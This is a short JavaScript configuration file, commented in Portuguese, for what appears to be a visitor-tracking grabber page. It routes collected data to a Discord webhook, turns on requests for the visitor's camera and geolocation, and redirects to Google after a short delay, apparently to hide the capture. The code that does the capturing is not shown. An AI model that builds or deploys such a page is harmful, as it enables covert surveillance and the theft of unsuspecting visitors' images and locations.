// config opcional externa (pode ser sobrescrita via querystring)
// Você pode mover webhookUrl e finalUrl para cá e manter index.html limpo

window.OSINT_CONFIG = window.OSINT_CONFIG || {};
Object.assign(window.OSINT_CONFIG, {
  webhookUrl: "https://discord.com/api/webhooks/ABC123",
  finalUrl: "https://www.google.com",
  requestCamera: true,
  requestGeo: true,
  redirectDelayMs: 1500,
  debug: false
});
